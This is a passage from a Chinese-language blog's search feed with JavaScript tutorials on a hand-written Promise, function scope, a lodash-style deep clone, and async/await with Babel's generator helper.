class="line">      self.status = &apos;rejected&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">    callback(resolve, reject)</span><br><span class="line">  &#125; catch(e) &#123;</span><br><span class="line">    reject(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myPromise.prototype.then = function(onResolved, onRejected) &#123;</span><br><span class="line">  const self = this;</span><br><span class="line">  switch(self.status)&#123;</span><br><span class="line">    case &quot;resolved&quot;:</span><br><span class="line">      onResolved(self.value);</span><br><span class="line">      break;</span><br><span class="line">    case &quot;rejected&quot;:</span><br><span class="line">      onRejected(self.reason);</span><br><span class="line">      break;</span><br><span class="line">    default:       </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 测试一下</span><br><span class="line">var p = new myPromise((r, j) =&gt; &#123;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">      r(66666)</span><br><span class="line">  &#125;, 3000)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.then((v) =&gt; &#123;</span><br><span class="line">  console.log(v) // 6666</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="函数的this"><a href="#函数的this" class="headerlink" title="函数的this"></a>函数的this</h2><ol>
<li>问一下两段代码各输出什么？<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line">    foo(); // 这里相当于window.foo()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line"></span><br><span class="line">    function foo() &#123;</span><br><span class="line">        console.log(value);</span><br><span class="line">    &#125;</span><br><span class="line">    foo(); // 这里在bar函数作用域内</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 2</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-clone]]></title>
      <url>https://fuzhongfeng.github.io/2018/05/24/javascript-clone/</url>
      <content type="html"><![CDATA[<h1 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">// lodash 中还添加了node中的数据类型，如ArrayBuffer等。</span><br><span class="line">const mapTag = &apos;[object Map]&apos;;</span><br><span class="line">const setTag = &apos;[object Set]&apos;;</span><br><span class="line">const arrayTag = &apos;[object Array]&apos;;</span><br><span class="line">const objectTag = &apos;[object Object]&apos;;</span><br><span class="line">const argsTag = &apos;[object Arguments]&apos;;</span><br><span class="line"></span><br><span class="line">const boolTag = &apos;[object Boolean]&apos;;</span><br><span class="line">const dateTag = &apos;[object Date]&apos;;</span><br><span class="line">const numberTag = &apos;[object Number]&apos;;</span><br><span class="line">const stringTag = &apos;[object String]&apos;;</span><br><span class="line">const symbolTag = &apos;[object Symbol]&apos;;</span><br><span class="line">const errorTag = &apos;[object Error]&apos;;</span><br><span class="line">const regexpTag = &apos;[object RegExp]&apos;;</span><br><span class="line">const funcTag = &apos;[object Function]&apos;;</span><br><span class="line"></span><br><span class="line">const deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 判断是否为对象（lodash）</span><br><span class="line"> * isObject(&#123;&#125;) // =&gt; true</span><br><span class="line"> * isObject([1, 2, 3]) // =&gt; true</span><br><span class="line"> * isObject(Function) // =&gt; true</span><br><span class="line"> * isObject(null) // =&gt; false</span><br><span class="line"> */</span><br><span class="line">function isObject(value) &#123;</span><br><span class="line">  const type = typeof value</span><br><span class="line">  return value != null &amp;&amp; (type === &apos;object&apos; || type === &apos;function&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 获取初始化对象</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> */</span><br><span class="line">function getInit(target) &#123;</span><br><span class="line">  const Ctor = target.constructor;</span><br><span class="line">  return new Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 获取值类型</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> */</span><br><span class="line">function getType(target) &#123;</span><br><span class="line">  return Object.prototype.toString.call(target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 非遍历类型克隆</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> * @param &#123;*&#125; type </span><br><span class="line"> */</span><br><span class="line">function cloneOtherType(target, type) &#123;</span><br><span class="line">  const Ctor = target.constructor;</span><br><span class="line">  switch (type) &#123;</span><br><span class="line">    case boolTag:</span><br><span class="line">    case numberTag:</span><br><span class="line">    case stringTag:</span><br><span class="line">    case errorTag:</span><br><span class="line">    case dateTag:</span><br><span class="line">      return new Ctor(+target); // 传入时间戳兼容性更好，同lodash</span><br><span class="line">    case regexpTag:</span><br><span class="line">      return cloneRegExp(target);</span><br><span class="line">    case symbolTag:</span><br><span class="line">      return cloneSymbol(target);</span><br><span class="line">    case funcTag:</span><br><span class="line">      // return cloneFunction(target);</span><br><span class="line">      return target; // 函数可以不做处理，返回自身</span><br><span class="line">    default:</span><br><span class="line">      return null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆正则表达式（lodash）</span><br><span class="line"> * @param &#123;*&#125; regexp </span><br><span class="line"> */</span><br><span class="line">function cloneRegExp(regexp) &#123;</span><br><span class="line">  const reFlags = /\w*$/;</span><br><span class="line">  const result = new regexp.constructor(regexp.source, reFlags.exec(regexp));</span><br><span class="line">  result.lastIndex = regexp.lastIndex;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆Symbol(lodash)</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> */</span><br><span class="line">function cloneSymbol(target) &#123;</span><br><span class="line">  return Object(Symbol.prototype.valueOf.call(target));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆函数(可不处里)</span><br><span class="line"> * @param &#123;*&#125; func </span><br><span class="line"> */</span><br><span class="line">function cloneFunction(func) &#123;</span><br><span class="line">  const bodyReg = /(?&lt;=&#123;)(.|\n)+(?=&#125;)/m;</span><br><span class="line">  const paramReg = /(?&lt;=\().+(?=\)\s+&#123;)/;</span><br><span class="line">  const funcString = func.toString();</span><br><span class="line">  if (func.prototype) &#123;</span><br><span class="line">    const param = paramReg.exec(funcString);</span><br><span class="line">    const body = bodyReg.exec(funcString);</span><br><span class="line">    if (body) &#123;</span><br><span class="line">      if (param) &#123;</span><br><span class="line">        const paramArr = param[0].split(&apos;,&apos;);</span><br><span class="line">        return new Function(...paramArr, body[0]);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return new Function(body[0]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return null;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return eval(funcString);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 遍历函数</span><br><span class="line"> * @param &#123;*&#125; array </span><br><span class="line"> * @param &#123;*&#125; iteratee </span><br><span class="line"> */</span><br><span class="line">function forEach(array, iteratee) &#123;</span><br><span class="line">  let index = -1;</span><br><span class="line">  const length = array.length;</span><br><span class="line">  while (++index &lt; length) &#123;</span><br><span class="line">    iteratee(array[index], index);</span><br><span class="line">  &#125;</span><br><span class="line">  return array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆主函数</span><br><span class="line"> * @param &#123;*&#125; target 被克隆对象</span><br><span class="line"> * @param &#123;*&#125; map 处理循环引用, lodash用构建了一个栈来存储键值对，后续解析</span><br><span class="line"> */</span><br><span class="line">function clone(target, map = new WeakMap()) &#123;</span><br><span class="line">  // 克隆原始类型</span><br><span class="line">  if (!isObject(target)) return target;</span><br><span class="line"></span><br><span class="line">  // 初始化</span><br><span class="line">  const type = getType(target);</span><br><span class="line"></span><br><span class="line">  // 处理形如 new Number(1) 的原始值</span><br><span class="line">  if (!deepTag.includes(type)) return cloneOtherType(target, type);</span><br><span class="line"></span><br><span class="line">  // 原始类型</span><br><span class="line">  if (deepTag.includes(type)) &#123; // 引用类型</span><br><span class="line">    const cloneTarget = getInit(target, type);</span><br><span class="line">    const mapTarget = map.get(target);</span><br><span class="line"></span><br><span class="line">    // 防止循环引用</span><br><span class="line">    if (mapTarget) return mapTarget;</span><br><span class="line">    map.set(target, cloneTarget);</span><br><span class="line"></span><br><span class="line">    // 克隆set</span><br><span class="line">    if (type === setTag) &#123;</span><br><span class="line">      target.forEach(value =&gt; &#123;</span><br><span class="line">        cloneTarget.add(clone(value, map));</span><br><span class="line">      &#125;);</span><br><span class="line">      return cloneTarget;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 克隆map</span><br><span class="line">    if (type === mapTag) &#123;</span><br><span class="line">      target.forEach((value, key) =&gt; &#123;</span><br><span class="line">        cloneTarget.set(key, clone(value, map));</span><br><span class="line">      &#125;);</span><br><span class="line">      return cloneTarget;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 克隆对象和数组</span><br><span class="line">    const keys = type === arrayTag ? undefined : Object.keys(target);</span><br><span class="line">    forEach(keys || target, (value, key) =&gt; &#123;</span><br><span class="line">      if (keys) &#123;</span><br><span class="line">        // 对象结构键不使用索引</span><br><span class="line">        key = value;</span><br><span class="line">      &#125;</span><br><span class="line">      cloneTarget[key] = clone(target[key], map);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return cloneTarget;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default clone;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-async/await]]></title>
      <url>https://fuzhongfeng.github.io/2018/05/24/javascript-asyncAwait/</url>
      <content type="html"><![CDATA[<h1 id="async-await-双刃剑"><a href="#async-await-双刃剑" class="headerlink" title="async/await 双刃剑"></a>async/await 双刃剑</h1><h2 id="async-await：继续-promise、Generator-之后-es7-提出的异步操作的解决方案"><a href="#async-await：继续-promise、Generator-之后-es7-提出的异步操作的解决方案" class="headerlink" title="async/await：继续 promise、Generator 之后 es7 提出的异步操作的解决方案"></a>async/await：继续 promise、Generator 之后 es7 提出的异步操作的解决方案</h2><h3 id="我们之前写回调是这样的"><a href="#我们之前写回调是这样的" class="headerlink" title="我们之前写回调是这样的"></a>我们之前写回调是这样的</h3><pre><code>// 通常写法
a(() =&gt; {
    b(() =&gt; {
        c()
    })
})

// promise
new Promise(function (resolve, reject) {
    resolve()
}).then(function () {
    return new Promise(function (resolve, reject) {
        resolve()
    });
}).then(function () {
});
</code></pre><h3 id="async-await-写法"><a href="#async-await-写法" class="headerlink" title="async/await 写法"></a>async/await 写法</h3><pre><code>// 是不是很清新
(async () =&gt; {
    await a()
    await b()
    await c()
})()
</code></pre><h3 id="async-await-描述"><a href="#async-await-描述" class="headerlink" title="async/await 描述"></a>async/await 描述</h3><ul>
<li><p>当调用一个 async 函数时，会返回一个 Promise 对象。当这个 async 函数返回一个值时，Promise 的 resolve 方法会负责传递这个值；当 async 函数抛出异常时，Promise 的 reject 方法也会传递这个异常值。（可以用.then 接收 return 值 或 遇到 reject直接用 .catch 抓取）</p>
</li>
<li><p>async 函数中可能会有 await 表达式，这会使 async 函数暂停执行，等待表达式中的 Promise 解析完成后继续执行 async 函数并返回解决结果</p>
</li>
</ul>
<h3 id="一些优点："><a href="#一些优点：" class="headerlink" title="一些优点："></a>一些优点：</h3><ul>
<li>使用Async/Await明显节约了不少代码。我们不需要写.then，不需要写匿名函数处理 Promise 的 resolve值，也不需要定义多余的 data 变量，还避免了嵌套代码。这些小的优点会迅速累计起来，这在之后的代码示例中会更加明显</li>
<li>Generator 函数的执行必须靠执行器，所以才有了co 模块，而async函数自带执行器。也就是说，async函数的执行，与普通函数一模一样，只要一行。</li>
<li>更好的语义，更广的适用性，await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）</li>
</ul>
<h2 id="一些使用中的问题："><a href="#一些使用中的问题：" class="headerlink" title="一些使用中的问题："></a>一些使用中的问题：</h2><h3 id="下面是随处可见的前端代码"><a href="#下面是随处可见的前端代码" class="headerlink" title="下面是随处可见的前端代码"></a>下面是随处可见的前端代码</h3><pre><code>// 先写ABCD4个列表请求

function getAList() {
    return new Promise((resolve) =&gt; {
        setTimeout(() =&gt; {
            resolve()
        }, 3000)
    }).then(() =&gt; {
        console.log(&quot;getAList&quot;)
    })
}

function getBList() {
    return new Promise((resolve) =&gt; {
        setTimeout(() =&gt; {
            resolve()
        }, 3000)
    }).then(() =&gt; {
        console.log(&quot;getBList&quot;)
    })
}

function getCList() {
    return new Promise((resolve) =&gt; {
        setTimeout(() =&gt; {
            resolve()
        }, 3000)
    }).then(() =&gt; {
        console.log(&quot;getCList&quot;)
    })
}

function getDList() {
    return new Promise((resolve) =&gt; {
        setTimeout(() =&gt; {
        resolve()
        }, 3000)
    }).then(() =&gt; {
        console.log(&quot;getDList&quot;)
    })
}

// 一个页面发送 getAList getBList 两个请求之后进行的渲染
(async () =&gt; {
    console.time(&quot;Time&quot;)
    await getAList()
    await getBList()
    console.log(&quot;finish&quot;)
    console.timeEnd(&quot;Time&quot;)
})()
// 用时 6ms
</code></pre><ul>
<li>当 getAList 和 getBList 之间没有依赖的时候顺序的 await 会最多让执行时间增加一倍的 getAList 函数时间（如果 getBList 的执行时间大于 getAList 的执行时间）,因为 getAList 与 getBList 应该并行执行。</li>
</ul>
<h3 id="正确的做法应该是先同时执行函数，再-await-返回值，这样可以并行执行异步函数"><a href="#正确的做法应该是先同时执行函数，再-await-返回值，这样可以并行执行异步函数" class="headerlink" title="正确的做法应该是先同时执行函数，再 await 返回值，这样可以并行执行异步函数:"></a>正确的做法应该是先同时执行函数，再 await 返回值，这样可以并行执行异步函数:</h3><pre><code>(async () =&gt; {
    console.time(&quot;Time&quot;)
    const getAListResult = getAList()
    const getBListResult = getBList()
    await getAListResult
    await getBListResult
    console.log(&quot;finish&quot;)
    console.timeEnd(&quot;Time&quot;)
})()
// 用时 3ms


// Promise.all 写法并发执行多个 promise
(async () =&gt; {
    console.time(&quot;Time&quot;)
    Promise.all([getAList(), getBList()]).then(() =&gt; {
    console.log(&quot;finish&quot;)
    console.timeEnd(&quot;Time&quot;)
    })
})()
// 用时 3ms
</code></pre><h2 id="看来不要随意的-await，它很可能让你的代码性能降低！！！"><a href="#看来不要随意的-await，它很可能让你的代码性能降低！！！" class="headerlink" title="看来不要随意的 await，它很可能让你的代码性能降低！！！"></a><em>看来不要随意的 await，它很可能让你的代码性能降低！！！</em></h2><h3 id="async-await-语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调："><a href="#async-await-语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调：" class="headerlink" title="async/await 语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调："></a>async/await 语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调：</h3><pre><code>a(() =&gt; {
    b()
})

c(() =&gt; {
    d()
})
</code></pre><h4 id="1-如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式："><a href="#1-如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式：" class="headerlink" title="1. 如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式："></a>1. 如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式：</h4><pre><code>await a();
await b();
await c();
await d();

// 因为翻译成回调，就变成了下面这样，async/await 会让我们倾向于在 b 执行完后，再执行 c
a(() =&gt; {
    b(() =&gt; {
        c(() =&gt; {
            d()
        });
    });
});
</code></pre><h4 id="2-我们想到上面的例子，可以优化一下性能："><a href="#2-我们想到上面的例子，可以优化一下性能：" class="headerlink" title="2. 我们想到上面的例子，可以优化一下性能："></a>2. 我们想到上面的例子，可以优化一下性能：</h4><pre><code>const resA = a();
const resC = c();
await resA;
b();
await resC;
d();

// 但是，d 原本只要等待 c 执行完，现在如果 a 执行时间比 c 长，就变成了这样：
a(() =&gt; {
    d();
});
</code></pre><h4 id="3-看来只有完全隔离成两个函数："><a href="#3-看来只有完全隔离成两个函数：" class="headerlink" title="3. 看来只有完全隔离成两个函数："></a>3. 看来只有完全隔离成两个函数：</h4><pre><code>(async () =&gt; {
    await a();
    b();
})()

(async () =&gt; {
    await c();
    d();
})();
</code></pre><h4 id="4-或者利用-Promise-all"><a href="#4-或者利用-Promise-all" class="headerlink" title="4. 或者利用 Promise.all"></a>4. 或者利用 Promise.all</h4><pre><code>const ab = async () =&gt; {
    await getAList();
    getBList();
}
const cd = async () =&gt; {
    await getCList();
    getDList();
}
Promise.all([ab(), cd()])
</code></pre><h3 id="现在我们回头来看一下原来两对的回调函数："><a href="#现在我们回头来看一下原来两对的回调函数：" class="headerlink" title="现在我们回头来看一下原来两对的回调函数："></a>现在我们回头来看一下原来两对的回调函数：</h3><pre><code>a(() =&gt; {
    b()
})

c(() =&gt; {
    d()
})
</code></pre><h3 id="现在来看想使用好-async-await-真的会那么简单吗？回调方式这么简单的过程式代码，换成-async-await-居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用-async-await-的时候多一些思考，谢谢大家"><a href="#现在来看想使用好-async-await-真的会那么简单吗？回调方式这么简单的过程式代码，换成-async-await-居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用-async-await-的时候多一些思考，谢谢大家" class="headerlink" title="现在来看想使用好 async/await 真的会那么简单吗？回调方式这么简单的过程式代码，换成 async/await 居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用 async/await 的时候多一些思考，谢谢大家"></a>现在来看想使用好 async/await 真的会那么简单吗？回调方式这么简单的过程式代码，换成 async/await 居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用 async/await 的时候多一些思考，谢谢大家</h3><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h4 id="一下为-babel-的源码（不包含词法转换）"><a href="#一下为-babel-的源码（不包含词法转换）" class="headerlink" title="一下为 babel 的源码（不包含词法转换）:"></a>一下为 babel 的源码（不包含词法转换）:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    // generator 语法</span><br><span class="line">    var info = gen[key](arg);</span><br><span class="line">    var value = info.value;</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (info.done) &#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // await 后的值包装一层 promise 返回.</span><br><span class="line">    // value 为非 promise 时直接返回，value 为 promise 时则 then 之后再继续执行 generator 的 next 方法</span><br><span class="line">    Promise.resolve(value).then(_next, _throw);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _asyncToGenerator(fn) &#123;</span><br><span class="line">  return function() &#123;</span><br><span class="line">    var self = this,</span><br><span class="line">      args = arguments;</span><br><span class="line">    // async function 返回 promise 的原因</span><br><span class="line">    return new Promise(function(resolve, reject) &#123;</span><br><span class="line">      var gen = fn.apply(self, args);</span><br><span class="line"></span><br><span class="line">      function _next(value) &#123;</span><br><span class="line">        asyncGeneratorStep(gen, resolve, reject, _next, _throw, &quot;next&quot;, value);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function _throw(err) &#123;</span><br><span class="line">        asyncGeneratorStep(gen, resolve, reject, _next, _throw, &quot;throw&quot;, err);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      _next(undefined);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = _asyncToGenerator;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>测试一下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// babel</span><br><span class="line">const babelFunc = _asyncToGenerator(function* () &#123;</span><br><span class="line">  console.log(1);</span><br><span class="line">  yield new Promise(resolve =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      resolve();</span><br><span class="line">      console.log(&apos;sleep 1s&apos;);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">  &#125;);</span><br><span class="line">  console.log(2);</span><br><span class="line">  const a = yield Promise.resolve(&apos;a&apos;);</span><br><span class="line">  const b = yield Promise.resolve(&apos;b&apos;);</span><br><span class="line">  const c = yield Promise.resolve(&apos;c&apos;);</span><br><span class="line">  console.log(3);</span><br><span class="line">  return [a, b, c];</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">babelFunc().then(res =&gt; &#123;</span><br><span class="line">  console.log(res)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// async await</span><br><span class="line">const asyncFunc = async () =&gt; &#123;</span><br><span class="line">  console.log(1)</span><br><span class="line">  await new Promise((resolve) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      resolve()</span><br><span class="line">      console.log(&apos;1s&apos;)</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">  &#125;)</span><br><span class="line">  